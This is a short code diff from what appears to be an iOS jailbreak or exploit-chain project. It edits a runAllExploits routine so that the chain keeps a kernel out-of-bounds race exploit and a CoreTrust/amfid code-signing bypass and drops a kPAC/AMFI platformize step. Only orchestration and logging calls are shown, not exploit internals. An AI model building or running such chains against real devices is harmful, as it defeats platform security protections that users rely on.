@@ -387,7 +387,7 @@ static BOOL g_run_all_exploits_running = NO;
 
         // ── Step 1: Kernel exploit ──
         printf("[runAllExploits]\n");
-        printf("[runAllExploits] --- Step 1/3: Kernel exploit (OOB race) ---\n");
+        printf("[runAllExploits] --- Step 1/2: Kernel exploit (OOB race) ---\n");
         if (!kexploit_krw_ready()) {
             int r = kexploit_opa334();
             if (r != 0) {
@@ -399,18 +399,9 @@ static BOOL g_run_all_exploits_running = NO;
             printf("[runAllExploits] SKIP: kernel r/w already available\n");
         }
 
-        // ── Step 2: kPAC bypass + AMFI platformize ──
+        // ── Step 2: CoreTrust bypass ──
         printf("[runAllExploits]\n");
-        printf("[runAllExploits] --- Step 2/3: kPAC bypass + AMFI platformize ---\n");
-        if (!kpac_platformize_self()) {
-            printf("[runAllExploits] FAILED: kpac_platformize_self\n");
-            goto cleanup;
-        }
-        printf("[runAllExploits] OK: kPAC bypassed, process platformized\n");
-
-        // ── Step 3: CoreTrust bypass ──
-        printf("[runAllExploits]\n");
-        printf("[runAllExploits] --- Step 3/3: CoreTrust bypass (amfid NOP + MSM) ---\n");
+        printf("[runAllExploits] --- Step 2/2: CoreTrust bypass (amfid NOP + MSM) ---\n");
         if (!coretrust_bypass_all()) {
             printf("[runAllExploits] FAILED: coretrust_bypass_all\n");
             goto cleanup;
